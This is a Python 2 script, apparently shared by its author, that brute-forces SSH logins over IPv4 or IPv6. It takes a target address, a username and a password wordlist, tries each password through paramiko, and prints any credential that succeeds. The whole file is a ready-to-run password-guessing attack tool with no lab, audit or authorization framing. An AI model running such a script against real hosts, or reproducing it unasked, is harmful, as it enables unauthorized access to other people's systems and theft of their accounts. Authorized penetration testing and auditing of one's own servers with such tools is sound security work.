#!/usr/bin/python
#
# Author ScianKabestia
# Version 1.2
# Python 2.7.x
# DESCRIPTION: SSH Bruteforce from Wordlist File for IPv4 & IPv6
#              Added Support for IPv6
#
# Requirements: termcolor, paramiko 
#               pip install termcolor && pip install paramiko
# 

import paramiko
import time
import sys
import os
import socket
from termcolor import *
global host, username, input_file, line
# Global Variables

line = "\n--------------------------------------\n"

print "------------------------------"
print (colored("<<< [+] SSH BRUTE >>>",'yellow'))
print          "        IPv4 & IPv6  "
print "Author: ScianKaBestia"
print "Version: 1.2"
print "------------------------------\n"

# Description
try:    
	print                    "WARNING: for IPv6 use %interface"
	print                    "EXAMPLE: fe80::a00:27ff:fee0:8b72%eth0"
	host= raw_input (colored(     "[+] Enter Target IP: " ,'blue'))
	username= raw_input(colored(  "[+] Enter SSH Username: ",'blue'))
	input_file= raw_input(colored("[+] Enter Wordlist path: ", 'blue'))
	print                         "[*]... Loading List ..... " 

	if os.path.exists(input_file)== False:
		print (colored("\n[-] File Path Doesn't Exist!",'red'))
		sys.exit(4)

except KeyboardInterrupt:# if user press Ctrl+c 
	print (colored("\n\n[*] PROCESS STOPPED", 'red'))
	sys.exit(3)

def ssh_connect(password, code=0): #[+] Connection Established
	ssh=paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:                      # Port
		ssh.connect(host, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		code=1  #[!] Authentication Failled
	except socket.error, e:
		code=2 #[!] Host down or Connection refused through a Firewall

	ssh.close()
	return code

input_file = open(input_file)
print ""

for i in input_file.readlines():
	password=i.strip("\n")
	try:
		response=ssh_connect(password)

		if response==0: #[+]Connection Established
			print(colored("%s[+] USER: %s [+] PASSWORD FOUND: %s [+] TARGET: %s%s" %(line ,username, password, host, line),'green'))
			print(colored("SSH Login - [ssh user@IP]",'grey'))#Print values,
			sys.exit(0)
		elif response==1: #[!]Authentication Failed
			print(colored(" USER: %s  TRYING PASSWORD: %s [LOGIN INCORRECT]" %(username,password),'yellow'))
		elif response==2: #[!]Connection Refused
			print(colored("[ERROR] COULDN'T CONNECT TO HOST: %s ; IS DOWN OR THERE IS FIREWALL IN PLACE" %(host),'yellow'))
			sys.exit(2)
			
	except KeyboardInterrupt:# If user press Ctrl+c
		print (colored("\n\n[*] PROCESS STOPPED",'red'))
		sys.exit(3)
	except Exception, e:
	    print e
	    pass

input_file.close()
